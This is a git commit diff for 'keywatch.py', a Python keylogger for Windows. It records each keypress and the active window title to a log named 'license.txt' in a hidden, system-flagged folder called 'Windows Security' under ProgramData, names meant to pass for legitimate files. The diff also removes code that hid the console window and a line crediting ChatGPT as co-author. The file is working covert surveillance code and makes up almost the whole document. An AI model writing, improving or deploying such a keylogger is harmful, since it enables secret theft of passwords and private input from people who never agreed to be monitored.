6a9e61707250e709e3051a163d704d29736063c6
Alex <112651933+Arkemmm@users.noreply.github.com>
2023-06-11 19:09:01 +0200

    Huge update

--- keywatch.py
+++ keywatch.py
@@ -5,16 +5,21 @@
 #██╔═██╗░██╔══╝░░░░╚██╔╝░░░░████╔═████║░██╔══██║░░░██║░░░██║░░██╗██╔══██║
 #██║░╚██╗███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░╚█████╔╝██║░░██║
 #╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
-#Made by Arkem using ChatGPT
 
 import os
-import sys
 import datetime
-import win32gui
+from win32gui import GetForegroundWindow, GetWindowText
 import keyboard
-import ctypes
-import win32con
-import win32api
+from win32con import FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM
+from win32api import SetFileAttributes
+
+hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
+os.makedirs(hidden_folder, exist_ok=True)
+
+attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+SetFileAttributes(hidden_folder, attributes)
+
+log_file = os.path.join(hidden_folder, 'license.txt')
 
 KEY_MAP = {
     " ": "[SPACE]",
@@ -37,7 +42,7 @@ KEY_MAP = {
     "left": "[LEFT]",
     "gauche": "[LEFT]",
     "right": "[RIGHT]",
-    "droite": "[LEFT]",
+    "droite": "[RIGHT]",
     "page up": "[PAGE UP]",
     "pg.suiv": "[PAGE UP]",
     "page down": "[PAGE DOWN]",
@@ -63,30 +68,40 @@ KEY_MAP = {
     "f12": "[F12]",
 }
 
-hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
-os.makedirs(hidden_folder, exist_ok=True)
-
-attributes = win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
-win32api.SetFileAttributes(hidden_folder, attributes)
-
-log_file = os.path.join(hidden_folder, 'license.txt')
+def get_window_title():
+    hwnd = GetForegroundWindow()
+    window_title = GetWindowText(hwnd)
+    return window_title
 
 
 def write_keys(keys_pressed, last_time, file):
     with open(file, "a") as f:
-        if "[ENTER]" in keys_pressed:
-            f.write("[ENTER]\n")
+        current_time = datetime.datetime.now()
+        time_diff = (current_time - last_time).total_seconds()
+        window_title = get_window_title()
+
+        if window_title != write_keys.last_window_title:
+            f.write(f"\n[WINDOW TITLE] -> {window_title}\n")
+            write_keys.last_window_title = window_title
+
+        if time_diff >= 1:
+            time_str = f"({int(time_diff)} s)"
+            if time_diff < 2:
+                time_str = f"({int(time_diff * 1000)} ms)"
+            if keys_pressed:
+                f.write(f"{time_str} {''.join(keys_pressed)} ")
+                keys_pressed.clear()
         else:
-            current_time = datetime.datetime.now()
-            time_diff = (current_time - last_time).total_seconds()
-            if time_diff >= 1:
-                time_str = f"({int(time_diff)} s)"
-                if time_diff < 2:
-                    time_str = f"({int(time_diff * 1000)} ms)"
-                f.write(f"{time_str} {''.join(keys_pressed)}")
-            else:
+            if keys_pressed:
                 f.write(''.join(keys_pressed))
-        return current_time
+                keys_pressed.clear()
+
+        f.flush()
+        last_time = current_time
+
+        return last_time
+
+write_keys.last_window_title = ""
 
 def on_press(event):
     try:
@@ -100,26 +115,16 @@ def on_press(event):
     except Exception as e:
         print(f"Error: {e}")
 
-def set_process_name():
-    if hasattr(sys, 'frozen'):
-        kernel32 = ctypes.WinDLL('kernel32')
-        kernel32.SetConsoleTitleW("Keywatch")
-
-def set_window_properties():
-    hwnd = win32gui.GetForegroundWindow()
-    win32gui.SetWindowText(hwnd, "Keywatch")
-    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
-
 if __name__ == "__main__":
-    set_process_name()
-    set_window_properties()
-
     with open(log_file, "a") as f:
-        f.write(f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
+        f.write(
+            f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n"
+        )
 
     last_time = datetime.datetime.now()
+    window_title = get_window_title()
+    write_keys.last_window_title = window_title
 
-    while True:
-        keyboard.on_press(on_press)
-        keyboard.wait()
+    on_press_event = on_press
+    keyboard.on_press(on_press_event)
+    keyboard.wait()
